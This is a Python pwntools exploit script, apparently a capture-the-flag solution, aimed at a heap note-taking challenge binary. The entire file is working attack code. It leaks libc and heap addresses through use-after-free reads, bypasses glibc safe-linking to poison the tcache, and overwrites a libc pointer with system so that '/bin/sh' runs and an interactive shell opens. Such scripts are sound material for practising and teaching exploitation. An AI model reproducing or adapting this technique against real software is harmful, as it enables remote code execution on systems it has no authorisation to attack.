#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def add_note(idx, size):
    slna(p, b': ', 1)
    slna(p, b': ', idx)
    slna(p, b': ', size)

def delete_note(idx):
    slna(p, b': ', 2)
    slna(p, b': ', idx)

def write_note(idx, size, data):
    slna(p, b': ', 3)
    slna(p, b': ', idx)
    slna(p, b': ', size)
    s(p, data)

def print_note(idx):
    slna(p, b': ', 4)
    slna(p, b': ', idx)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x00000000000015EE
        brva 0x00000000000016CA

        c
        ''')
        input()


if args.REMOTE:
    p = remote('0', 5000)
else:
    p = process([exe.path])

#########################################
### Phase 1: Leak heap & libc address ###
#########################################
add_note(0, 0x500)
add_note(1, 0x48)
add_note(2, 0x48)
add_note(3, 0x48)
delete_note(0)
delete_note(3)
delete_note(2)

print_note(0)
p.recvuntil(b'Data: ')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x21ace0
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

print_note(3)
p.recvuntil(b'Data: ')
heap_leak = u64(p.recv(5) + b'\0\0\0')
heap_base = heap_leak << 12
info("Heap leak: " + hex(heap_leak))
info("Heap base: " + hex(heap_base))

#################################
### Phase 2: Tcache poisoning ###
#################################
write_note(2, 0x27, p64( ((heap_base + 0x9c0) >> 12) ^ (libc.address + 0x21a070) ))
add_note(2, 0x48)
add_note(3, 0x48)

write_note(3, 0x47, b'/bin/sh\0'.ljust(0x28, b'\0') + p64(libc.sym.system))
print_note(3)

p.interactive()
